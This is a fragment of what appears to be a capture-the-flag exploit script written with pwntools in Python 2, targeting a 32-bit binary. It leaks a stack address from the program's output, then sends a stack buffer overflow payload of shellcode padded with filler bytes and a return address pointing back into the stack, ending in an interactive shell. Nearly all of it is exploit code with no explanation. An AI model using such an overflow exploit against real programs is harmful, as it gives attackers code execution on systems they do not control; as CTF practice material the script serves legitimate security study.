...
if DEBUG:
	...
	gdb.attach(p,"b*0x000000008048097\nc")
else:
...
# payload += 0x77-len(payload)
ru(":")
sd(payload)
stack_addr = u32(p.recv(0x14+0x8)[0x14+4:])
print "stack_addr="+hex(stack_addr)
payload = buf +"a"*((0x14*2+0x4)-len(buf))
payload += p32(stack_addr-0x14-0x8)
sd(payload)
p.interactive()